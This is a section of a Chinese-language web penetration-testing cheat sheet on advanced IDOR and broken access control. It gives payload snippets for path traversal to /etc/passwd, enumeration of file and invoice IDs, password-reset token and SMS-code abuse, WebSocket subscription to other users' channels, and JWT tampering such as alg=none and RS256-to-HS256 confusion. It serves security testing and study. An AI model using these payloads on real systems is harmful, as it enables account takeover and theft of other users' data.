## 五、特殊场景（高级）

### 5.1 文件下载/导出IDOR
```
?file=../../../etc/passwd
?file=user_123/../../admin/config.php
?file=report_2024_01.pdf        # 日期枚举
/download?id=1&token=xxx        # token是否绑定用户
/avatar/123.jpg
/export/invoice/INV-2024-0001.pdf  # 流水号枚举
# 签名URL绕过：OSS/CDN URL参数（Expires/AccessKeyId/Signature）
# 云存储ACL：bucket级公开读 vs 用户目录级隔离
```

### 5.2 重置密码/验证码IDOR
```
# 密码重置token是否绑定用户
POST /reset-password?token=xxx&new_password=yyy
# token有效但不验证归属 → 用自己token重置他人密码
# token在URL → 日志/Referer泄露
# token可预测（时间戳/短随机）

# 验证码：4位可枚举、未绑定手机、爆破
POST /verify-code {"phone":"<PHONE-REDACTED>","code":"123456"}
```

### 5.3 WebSocket IDOR
```javascript
// WS订阅他人频道
ws.send(JSON.stringify({type:"subscribe", channel:"user_2_messages"}));
ws.send(JSON.stringify({type:"get_history", user_id:2}));
// 跨站WebSocket劫持（CSWSH）→ 借助受害者会话越权
// 子协议切换特权通道
```

### 5.4 移动端API IDOR
```
- 抓包修改user_id/device_id/account_id
- device token替换/重放
- 反编译APK查看端点与参数（jadx/apktool）
- 移动端API常比Web端宽松（内部接口暴露）
```

### 5.5 JWT/Token ID篡改（高级）
```
1. alg=none：header改alg=none，payload改user_id
2. 弱密钥爆破：jwt_tool/john爆破HS256
3. RS256→HS256：公钥当HMAC密钥
4. kid路径遍历：{"kid":"../../dev/null"}（见api-security技能3.2）
5. jku/x5u远程密钥注入
6. 密钥类型混淆（CVE-2022-21449类）
7. refresh token混淆/跨client复用
8. 嵌入他人JWT（session固定）
```

